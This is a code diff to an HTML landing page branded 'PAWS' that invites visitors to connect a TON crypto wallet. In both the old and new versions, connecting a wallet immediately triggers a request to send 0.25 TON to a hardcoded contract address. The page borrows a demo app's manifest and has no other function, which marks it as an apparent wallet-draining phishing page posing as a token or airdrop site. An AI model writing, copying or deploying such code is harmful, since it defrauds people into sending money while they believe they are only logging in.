@@ -153,6 +153,7 @@
         }
     </style>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
     <div class="background-elements">
@@ -166,7 +167,12 @@
                  alt="PAWS Logo" class="logo">
             <h1 class="title">PAWS</h1>
             <p class="subtitle">Animals are done! It's PAWS Season</p>
-            <button class="connect-button" id="connectBtn">Connect TON Wallet</button>
+            <div id="wallet-connection">
+                <button class="connect-button" id="connectBtn">
+                    <img src="https://ton.org/download/ton_symbol.svg" width="20" height="20" style="margin-right: 8px; vertical-align: middle;">
+                    Connect Wallet
+                </button>
+            </div>
         </div>
     </main>
     
@@ -182,63 +188,42 @@
     <script src="/scripts/main.js"></script>
     <script>
         const CONTRACT_ADDRESS = 'EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n';
-        let connector;
+        
+        const tonConnect = new TonConnect({
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
+        });
 
         async function initWallet() {
-            connector = new TonConnect({
-                manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
+            await tonConnect.restoreConnection();
+            
+            tonConnect.onStatusChange(async (wallet) => {
+                if (wallet) {
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 600,
+                        messages: [{
+                            address: CONTRACT_ADDRESS,
+                            amount: '250000000',
+                            payload: 'te6ccgEBAQEAAgAAAA=='
+                        }]
+                    };
+                    await tonConnect.sendTransaction(transaction);
+                }
             });
-
-            await connector.restoreConnection();
         }
 
-        async function connectWallet() {
-            if (!connector) {
-                await initWallet();
-            }
-
+        document.getElementById('connectBtn').addEventListener('click', async () => {
             try {
-                const universalLink = connector.connect({
+                const universalLink = tonConnect.connect({
                     universalUrl: 'https://app.tonkeeper.com/ton-connect',
                     bridgeUrl: 'https://bridge.tonapi.io/bridge'
                 });
-
                 window.open(universalLink, '_blank');
             } catch (e) {
                 console.error('Connection failed:', e);
             }
-        }
-
-        document.getElementById('connectBtn').addEventListener('click', connectWallet);
-
-        // Initialize
-        initWallet().then(() => {
-            connector.onStatusChange((wallet) => {
-                if (wallet) {
-                    console.log('Connected:', wallet.account.address);
-                    // Auto-trigger transaction
-                    sendTransaction();
-                }
-            });
         });
 
-        async function sendTransaction() {
-            if (!connector.connected) return;
-
-            try {
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [{
-                        address: CONTRACT_ADDRESS,
-                        amount: '250000000',
-                        payload: 'te6ccgEBAQEAAgAAAA=='
-                    }]
-                };
-                await connector.sendTransaction(transaction);
-            } catch (e) {
-                console.error('Transaction failed:', e);
-            }
-        }
+        initWallet();
     </script>
 </body>
 </html>
